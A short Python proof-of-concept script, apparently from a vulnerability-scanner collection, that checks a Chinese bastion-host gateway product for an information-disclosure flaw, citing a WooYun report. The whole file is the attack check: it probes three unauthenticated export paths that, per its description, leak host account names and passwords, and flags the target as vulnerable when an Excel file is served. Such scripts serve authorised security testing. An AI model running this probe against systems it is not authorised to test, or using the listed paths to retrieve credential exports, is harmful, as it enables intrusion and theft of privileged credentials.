#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 江南科友堡垒机信息泄露
referer: http://www.wooyun.org/bugs/wooyun-2015-0135704
author: Lucifer
description: 江南科友堡垒机泄露主机账号密码。
'''
import sys
import warnings
import requests


class hac_gateway_info_disclosure_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        result = ['江南科友堡垒机信息泄露', '', '']
        headers = {
        "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payloads = ["/excel/sso_user_export.php",
                    "/excel/user_export.php",
                    "/excel/server_export.php"]

        try:
            noexist = True
            for payload in payloads:
                vulnurl = self.url + payload
                req = requests.head(vulnurl, headers=headers, timeout=10, verify=False)
                if r"application/vnd.ms-excel" in req.headers["Content-Type"]:
                    result[2] = '存在'
                    result[1]=vulnurl
                    noexist = False
            if noexist:
                result[2] = '不存在'
        except:
            result[2] = '未知'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = hac_gateway_info_disclosure_BaseVerify(sys.argv[1])
    testVuln.run()
